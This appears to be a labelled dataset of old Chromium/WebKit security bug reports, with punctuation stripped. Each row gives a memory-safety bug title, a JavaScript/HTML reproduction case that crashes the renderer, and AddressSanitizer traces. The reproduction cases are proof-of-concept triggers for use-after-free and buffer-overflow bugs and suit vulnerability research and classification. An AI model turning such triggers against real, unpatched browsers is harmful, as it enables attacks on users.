media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:57 4 in wtf vectordestructor true wtf refptr webcore cssfontface destruct wtf refptr webcore cssfontface wtf refptr webcore cssfontface media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/vector.h:57 5 in wtf refcounted webcore fontselector operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 6 in hashtable media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:313 7 in fontfallbacklist media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 8 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 9 in wtf refcounted webcore styleinheriteddata operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 10 in webcore renderstyle renderstyle media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 11 in wtf hashtable unsigned int std pair unsigned int webcore cssstyleselector matchedstyledeclarationcacheitem wtf pairfirstextractor std pair unsigned int webcore cssstyleselector matchedstyledeclarationcacheitem wtf inthash unsigned int wtf pairhashtraits wtf hashtraits unsigned int wtf hashtraits webcore cssstyleselector matchedstyledeclarationcacheitem wtf hashtraits unsigned int deallocatetable std pair unsigned int webcore cssstyleselector matchedstyledeclarationcacheitem int media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/hashtable.h:927 12 in webcore cssstyleselector operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstyleselector.h:102 13 in webcore svgfontfaceelement removedfromdocument media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgfontfaceelement.cpp:330 14 in webcore private noderemovaldispatcher webcore node true dispatch webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernodealgorithms.h:99 15 in wtf ownptr webcore documentmarkercontroller operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/ownptr.h:64 16 in wtf refcounted webcore range operator delete void media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:178 17 in void webcore domdata handleweakobject void webcore domdatastore domwrappermaptype v8 persistent v8 object void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/domdata.h:84 18 in webcore domdatastore weakdomobjectcallback v8 persistent v8 value void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/domdatastore.cpp:135 19 in v8 internal runtimeprofiler isenabled media/chromium/chromium/depot_tools/src/v8/src/runtime-profiler.h:50 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore svgfontfaceelement create webcore qualifiedname const webcore document media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgfontfaceelement.cpp:61 2 in wtf passrefptr webcore svgfontfaceelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 3 in webcore svgelementfactory createsvgelement webcore qualifiedname const webcore document bool media/chromium/chromium/depot_tools/src/out/release/obj/gen/webkit/svgelementfactory.cpp:642 4 in wtf passrefptr webcore svgelement leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 5 in wtf passrefptr webcore element leakref const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:161 6 in xmlparsestarttag2 media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:9126 7 in xmlparsetryorfinish media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:10847 8 in xmlparsechunk media/chromium/chromium/depot_tools/src/third_party/libxml/src/parser.c:11625 9 in webcore documentparser isstopped const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/documentparser.h:69 10 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 11 in deque media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/deque.h:370 12 in webcore documentloader commitdata char const unsigned long media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentloader.cpp:327 13 in webkit frameloaderclientimpl committedload webcore documentloader char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webkit/chromium/src/frameloaderclientimpl.cpp:1125 14 in webcore documentloader commitload char const int media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentloader.cpp:313 15 in webcore resourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/resourceloader.cpp:291 16 in webcore mainresourceloader didreceivedata char const int long long bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:464 17 in webcore inspectorinstrumentation hasfrontends media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/inspector/inspectorinstrumentation.h:217 18 in resourcedispatcher onreceiveddata ipc message const int base filedescriptor int int media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:404 19 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/./content/common/resource_messages.h:154 20 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 21 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:171 22 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 6238 aborting stats 40m malloced 30m for red zones by 82744 calls stats 2m realloced by 3475 calls stats 36m freed by 68055 calls stats 0m really freed by 0 calls stats 100m 25615 full pages mmaped in 25 calls mmaps by size class 8:65532 9:16382 10:12285 11:2047 12:1024 13:1536 14:256 15:256 16:64 17:64 18:16 19:8 21:6 mallocs by size class 8:62234 9:8847 10:7904 11:1676 12:380 13:1302 14:162 15:152 16:23 17:43 18:11 19:5 21:5 frees by size class 8:49693 9:7877 10:7301 11:1311 12:270 13:1255 14:144 15:138 16:16 17:29 18:11 19:5 21:5 rfrees by size class stats malloc large 64 small slow 422 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa	11
heap-use-after-free in webcore containernode appendchild vulnerability details use-after-free can be triggered when when trying to append child in svg for use element version 18.0.1024.0 developer build 119669 linux does not work on 16.0.912.77 m win7 x64 reproduction case script function go q document.getelementbyid root contentdocument q.firstchild.setattribute style content counter item document.designmode on q.execcommand selectall q.execcommand insertimage q.getelementbyid x appendchild q.firstchild.clonenode 1 q.execcommand undo script object data t.svg id root onload go object t.svg svg xmlns xmlns xlink text id x a text use xlink href x text a text style style svg for crashes please include the following additional information 8025 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in webcore node attached const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:684 1 in webcore svguseelement buildshadowtree webcore svgshadowtreerootelement webcore svgelement webcore svgelementinstance media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svguseelement.cpp:809 2 in webcore svguseelement buildshadowandinstancetree webcore svgshadowtreerootelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svguseelement.cpp:561 3 in wtf refptr webcore svgshadowtreerootelement operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 4 in webcore node renderer const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:473 5 in webcore containernode insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:196 6 in webcore removenodecommand dounapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/removenodecommand.cpp:63 7 in webcore editcommandcomposition unapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/compositeeditcommand.cpp:105 8 in wtf refcountedbase derefbase media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:127 9 in webcore executeundo webcore frame webcore event webcore editorcommandsource wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:1095 10 in webcore editor command execute wtf string const webcore event const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:1665 11 in webcore document execcommand wtf string const bool wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4174 12 in webcore documentinternal execcommandcallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8document.cpp:1503 13 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 14 15 16 17 18 19 20 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 21 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3603 22 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:432 23 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 24 in webcore v8lazyeventlistener calllistenerfunction webcore scriptexecutioncontext v8 handle v8 value webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8lazyeventlistener.cpp:75 25 in webcore v8abstracteventlistener invokeeventhandler webcore scriptexecutioncontext webcore event v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8abstracteventlistener.cpp:152 26 in scope media/chromium/chromium/depot_tools/src/v8/include/v8.h:3550 27 in webcore eventtarget fireeventlisteners webcore event webcore eventtargetdata wtf vector webcore registeredeventlistener 1ul media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventtarget.cpp:228 28 in webcore event defaultprevented const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/event.h:133 29 in webcore node handlelocalevents webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2747 30 in wtf passrefptr webcore event operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/passrefptr.h:76 31 in webcore eventdispatchmediator dispatchevent webcore eventdispatcher const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatchmediator.cpp:51 32 in webcore eventdispatcher dispatchevent webcore node wtf passrefptr webcore eventdispatchmediator media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/eventdispatcher.cpp:55 33 in webcore node dispatchevent wtf passrefptr webcore event media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:2761 34 in webcore domwindow dispatchloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/domwindow.cpp:1606 35 in webcore document dispatchwindowloadevent media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3696 36 in webcore frameloader checkcompleted media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:794 37 in webcore frameloader finishedparsing media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/frameloader.cpp:678 38 in webcore frame page const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/page/frame.h:345 39 in webcore documentwriter endifnotloadingmainresource media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/documentwriter.cpp:233 40 in webcore resourceerrorbase isnull const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/platform/network/resourceerrorbase.h:42 41 in webcore mainresourceloader didfinishloading double media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/loader/mainresourceloader.cpp:485 42 in webkit_glue weburlloaderimpl context oncompletedrequest net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/webkit/glue/weburlloader_impl.cc:654 43 in resourcedispatcher onrequestcomplete int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:489 44 in void dispatchtomethod resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks resourcedispatcher void resourcedispatcher int net urlrequeststatus const std basic_string char std char_traits char std allocator char const base timeticks const tuple4 int net urlrequeststatus std basic_string char std char_traits char std allocator char base timeticks const media/chromium/chromium/depot_tools/src/./base/tuple.h:566 45 in resourcedispatcher dispatchmessage ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:559 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1949266029 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 bfd dwarf error offset 1848602733 greater than or equal to debug_str size 80989744 bfd dwarf error offset 1949237248 greater than or equal to debug_line size 55251802 46 in resourcedispatcher onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/resource_dispatcher.cc:326 47 in childthread onmessagereceived ipc message const media/chromium/chromium/depot_tools/src/content/common/child_thread.cc:171 48 in ipc channelproxy context ondispatchmessage ipc message const media/chromium/chromium/depot_tools/src/ipc/ipc_channel_proxy.cc:263 49 in base callback void run const media/chromium/chromium/depot_tools/src/./base/callback.h:272 50 in messageloop deferorrunpendingtask base pendingtask const media/chromium/chromium/depot_tools/src/base/message_loop.cc:470 51 in messageloop dowork media/chromium/chromium/depot_tools/src/base/message_loop.cc:660 52 in base messagepumpdefault run base messagepump delegate media/chromium/chromium/depot_tools/src/base/message_pump_default.cc:28 53 in messageloop runinternal media/chromium/chromium/depot_tools/src/base/message_loop.cc:418 54 in autorunstate media/chromium/chromium/depot_tools/src/base/message_loop.cc:745 55 in renderermain content mainfunctionparams const media/chromium/chromium/depot_tools/src/content/renderer/renderer_main.cc:241 56 in runzygote media/chromium/chromium/depot_tools/src/content/app/content_main.cc:233 57 in content contentmain int char const content contentmaindelegate media/chromium/chromium/depot_tools/src/content/app/content_main.cc:457 58 in chromemain media/chromium/chromium/depot_tools/src/chrome/app/chrome_main.cc:32 59 in main media/chromium/chromium/depot_tools/src/chrome/app/chrome_exe_main_gtk.cc:18 60 in libc_start_main build/buildd/eglibc-2.12.1/csu/libc-start.c:258 is located 36 bytes inside of 376-byte region freed by thread t0 here 0 in operator delete void 0 1 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/rendersvgtransformablecontainer.h:30 2 in webcore renderobject arenadelete webcore renderarena void media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/renderobject.cpp:2294 3 in webcore node detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.cpp:1352 4 in webcore element detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:975 5 in wtf refptr webcore svgelementinstance operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:68 6 in webcore node nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:160 7 in webcore element detach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/element.cpp:975 8 in webcore node reattach media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:831 9 in webcore node nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:160 10 in webcore document styleselectorchanged webcore styleselectorupdateflag media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:3024 11 in wtf refptr webcore documentparser get const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:60 12 in webcore styleelement sheetloaded webcore document media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/styleelement.cpp:187 13 in webcore svgstyleelement sheetloaded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyleelement.h:61 14 in webcore cssstylesheet checkloaded media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/css/cssstylesheet.cpp:240 15 in webcore styleelement createsheet webcore element int wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/styleelement.cpp:172 16 in refptr media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:58 17 in webcore node nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:160 18 in webcore node getflag webcore node nodeflags const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:684 19 in webcore svgstyledelement updaterelativelengthsinformation media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledelement.h:78 20 in webcore node nextsibling const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:160 21 in webcore node getflag webcore node nodeflags const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:684 22 in webcore svgstyledelement updaterelativelengthsinformation media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svgstyledelement.h:78 23 in webcore notifychildinserted webcore node media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:1102 24 in webcore containernode appendchild wtf passrefptr webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:667 25 in webcore svguseelement buildshadowtree webcore svgshadowtreerootelement webcore svgelement webcore svgelementinstance media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svguseelement.cpp:809 26 in webcore svguseelement buildshadowandinstancetree webcore svgshadowtreerootelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/svg/svguseelement.cpp:561 27 in wtf refptr webcore svgshadowtreerootelement operator const media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:66 28 in webcore node renderer const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:473 29 in webcore containernode insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:196 previously allocated by thread t0 here 0 in operator new unsigned long 0 1 in webcore svgshadowtreerootelement create webcore document webcore svguseelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/svgshadowtreeelements.cpp:75 2 in webcore rendersvgshadowtreerootcontainer updatefromelement media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/rendering/svg/rendersvgshadowtreerootcontainer.cpp:56 3 in webcore node renderer const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/node.h:473 4 in webcore containernode insertbefore wtf passrefptr webcore node webcore node int bool media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/containernode.cpp:196 5 in webcore removenodecommand dounapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/removenodecommand.cpp:63 6 in webcore editcommandcomposition unapply media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/compositeeditcommand.cpp:105 7 in wtf refcountedbase derefbase media/chromium/chromium/depot_tools/src/third_party/webkit/source/javascriptcore/wtf/refcounted.h:127 8 in webcore executeundo webcore frame webcore event webcore editorcommandsource wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:1095 9 in webcore editor command execute wtf string const webcore event const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/editing/editorcommand.cpp:1665 10 in webcore document execcommand wtf string const bool wtf string const media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/dom/document.cpp:4174 11 in webcore documentinternal execcommandcallback v8 arguments const media/chromium/chromium/depot_tools/src/out/release/obj/gen/webcore/bindings/v8document.cpp:1503 12 in handleapicallhelper media/chromium/chromium/depot_tools/src/v8/src/builtins.cc:1220 13 14 15 16 17 18 19 in v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool media/chromium/chromium/depot_tools/src/v8/src/execution.cc:118 20 in v8 function call v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/v8/src/api.cc:3603 21 in webcore v8proxy instrumentedcallfunction webcore page v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:432 22 in webcore v8proxy callfunction v8 handle v8 function v8 handle v8 object int v8 handle v8 value media/chromium/chromium/depot_tools/src/third_party/webkit/source/webcore/bindings/v8/v8proxy.cpp:407 8025 aborting stats 38m malloced 27m for red zones by 75283 calls stats 3m realloced by 3261 calls stats 34m freed by 62217 calls stats 0m really freed by 0 calls stats 96m 24591 full pages mmaped in 24 calls mmaps by size class 8:65532 9:16382 10:8190 11:2047 12:1024 13:1536 14:256 15:256 16:64 17:64 18:16 19:8 21:6 mallocs by size class 8:58961 9:8571 10:4481 11:1313 12:487 13:1075 14:178 15:126 16:24 17:45 18:10 19:7 21:5 frees by size class 8:47478 9:7863 10:4088 11:1002 12:396 13:1043 14:160 15:117 16:17 17:31 18:10 19:7 21:5 rfrees by size class stats malloc large 67 small slow 367 shadow byte and word fd fd fd fd fd fd fd fd fd more shadow bytes fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd	11
bad cast in webcore renderblock createlineboxes vulnerability details a bug of renderblocks version chrome version all operating system linux 64bit reproduction case html head style el1 webkit-line-box-contain block webkit-column-count 1 el2 display list-item el3 after display block content a el4 display inline webkit-column-span all style script function crash el1 document.createelement div el1.setattribute id el1 document.body.appendchild el1 el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el3 document.createelement div el3.setattribute id el3 el2.appendchild el3 el4 document.createelement div el4.setattribute id el4 el3.appendchild el4 settimeout function el4.style.display='table 0 window.onload=crash script head body body html for crashes please include the following additional information type of crash renderer asan crash state 6826 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 8 at thread t0 0 in webcore inlineflowbox addtoline webcore inlinebox 0 1 in webcore renderblock createlineboxes webcore renderobject webcore lineinfo const webcore inlinebox 0 is located 8 bytes to the right of 56-byte region allocated by thread t0 here 0 in malloc 0 1 in webcore renderbox createinlinebox 0 2 in webcore renderblock createlineboxes webcore renderobject webcore lineinfo const webcore inlinebox 0 3 in webcore renderblock constructline webcore bidirunlist webcore bidirun webcore lineinfo const 0	11
heap-use-after-free in webcore inlineflowbox computeunderannotationadjustment vulnerability details this bug is giving me huge deja vu but i could n't find it in my list of open issues version chrome version stable beta dev chromium 19.0.1036.0 developer build 121128 os linux webkit 535.20 107140 javascript v8 3.9.4 operating system 64bit linux reproduction case html head style el0 webkit-column-width 0 el1 after display table-caption content a el2 webkit-column-span all style script function crash el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el1.appendchild document.createtextnode a el0.style.display='-webkit-box settimeout function el2.style.display='compact 0 window.onload=crash script head body body html html head style el0 webkit-column-width 1px content counter c el2 webkit-column-span all content counter c webkit-animation-name a webkit-animation-duration 0.1s style script function crash var el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement ol el1.setattribute id el1 el0.appendchild el1 el1.appendchild document.createtextnode a var el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el1.appendchild document.createtextnode a el1.style.display='-webkit-flexbox setinterval function document.body.style.zoom=math.random 2 1 window.onload=crash script head body body html html head style el0 webkit-animation-iteration-count 2 height 1px webkit-column-count 2 el1 height 2px webkit-text-emphasis-style circle el2 webkit-column-span all style script function crash el0 document.createelement div el0.setattribute id el0 document.body.appendchild el0 el1 document.createelement div el1.setattribute id el1 el0.appendchild el1 el2 document.createelement div el2.setattribute id el2 el1.appendchild el2 el1.appendchild document.createtextnode a el1.style.display='-webkit-box document.body.offsettop el2.style.display='table-header-group window.onload=crash script head body body html for crashes please include the following additional information type of crash renderer+asan crash state 8239 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlineflowbox computeunderannotationadjustment int const 0 1 in webcore renderblock layoutinlinechildren bool int int 0 is located 32 bytes inside of 80-byte region freed by thread t0 here 0 in free 0 1 in webcore inlinetextbox destroy webcore renderarena 0 2 in webcore rendertext dirtylineboxes bool 0 3 in webcore renderblock layoutinlinechildren bool int int 0 5014 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlinebox remove 0 1 in webcore renderblock willbedestroyed 0 is located 24 bytes inside of 80-byte region freed by thread t0 here 0 in free 0 1 in webcore inlinetextbox destroy webcore renderarena 0 2 in webcore rendertext dirtylineboxes bool 0 30949 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore inlineflowbox computeoverannotationadjustment int const 0 1 in webcore rootinlinebox selectiontop const 0 is located 32 bytes inside of 80-byte region freed by thread t0 here 0 in free 0 1 in webcore inlinetextbox destroy webcore renderarena 0 2 in webcore rendertext dirtylineboxes bool 0 3 in webcore renderblock layoutinlinechildren bool int int 0	11
heap-use-after-free in webcore renderquote placequote vulnerability details use-after-free with renderquote placequote version chrome version stable beta dev chromium 19.0.1038.0 developer build 121435 os linux webkit 535.21 107368 operating system linux 64bit reproduction case html head style el0 before el1 display table-column-group c1 first-of-type el4 before display compact style script function crash el0=document.createelement q el0.setattribute id el0 document.body.appendchild el0 el1=document.createelement q el1.setattribute id el1 el0.appendchild el1 el0.appendchild document.createtextnode a document.body.appendchild document.createelement hr el2=document.createelement div el2.setattribute class c1 el0.appendchild el2 el3=document.createelement span el3.setattribute class c1 document.body.appendchild el3 el4=document.createelement q el4.setattribute id el4 document.body.appendchild el4 document.designmode='on document.execcommand selectall document.execcommand bold document.execcommand inserttext false document.execcommand undo document.designmode='off window.onload=crash script head body body html for crashes please include the following additional information type of crash renderer asan crash state 7641 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore renderquote placequote 0 1 in webcore renderobjectchildlist appendchildnode webcore renderobject webcore renderobject bool 0 is located 112 bytes inside of 120-byte region freed by thread t0 here 0 in free 0 1 in webcore renderobjectchildlist destroyleftoverchildren 0 2 in webcore renderinline willbedestroyed 0	11
heap-buffer-overflow in void wtf vector unsigned short 0ul append unsigned short vulnerability details heap-buffer-overflow in webkit framecontentasplaintext version chrome version stable beta dev chromium 19.0.1040.0 developer build 121661 os linux webkit 535.21 107445 operating system 64bit linux reproduction case number of a s affects size of buffer html head style el0 visibility collapse el1 first-letter height 1 style script function crash el0=document.createelement div document.body.appendchild el0 el0.setattribute id el0 el1=document.createelement div document.body.appendchild el1 el1.setattribute id el1 el0.appendchild document.createtextnode unescape array 40 join a ufed5 el1.appendchild document.createtextnode unescape a u074b window.onload=crash script head body body html for crashes please include the following additional information type of crash renderer asan crash state 7426 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 2 at thread t0 0 in void wtf vector unsigned short 0ul append unsigned short unsigned short const unsigned long 0 1 in webkit framecontentasplaintext unsigned long webcore frame wtf vector unsigned short 0ul third_party/webkit/source/webkit/chromium/src/webframeimpl.cpp:0 2 in webkit webframeimpl contentastext unsigned long const 0 is located 76 bytes to the right of 34-byte region allocated by thread t0 here 0 in malloc 0 1 in wtf fastmalloc unsigned long 0 2 in wtf stringimpl create unsigned short const unsigned int 0	11
heap-use-after-free in webcore htmlelement ispresentationattribute vulnerability details use-after-free in element attributechanged version chrome version stable beta dev chromium 19.0.1040.0 developer build 121661 os linux webkit 535.21 107445 operating system 64bit linux reproduction case html head style el2 display block border-bottom-style ridge border-left-style ridge style script onload function el0=document.createelement table document.body.appendchild el0 el1=document.createelement div document.body.appendchild el1 el1.appendchild document.createtextnode a el2=document.createelement s el2.setattribute id el2 el2.setattribute class el1.appendchild el2 document.body.appendchild el2 el2.addeventlistener domsubtreemodified function el2.removeattribute class false document.body.removechild el0 document.designmode='on document.execcommand selectall document.execcommand inserttext false document.execcommand undo script head body body html for crashes please include the following additional information type of crash renderer asan crash state 16571 error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in webcore element attributechanged webcore attribute 0 1 in webcore namednodemap setattributes webcore namednodemap const 0 2 in webcore swapinnodepreservingattributesandchildren webcore htmlelement webcore htmlelement third_party/webkit is located 8 bytes inside of 24-byte region freed by thread t0 here 0 in free 0 1 in webcore element removeattribute wtf string const 0 2 in webcore elementinternal removeattributecallback v8 arguments const out/release/obj/gen/webkit/bindings	11
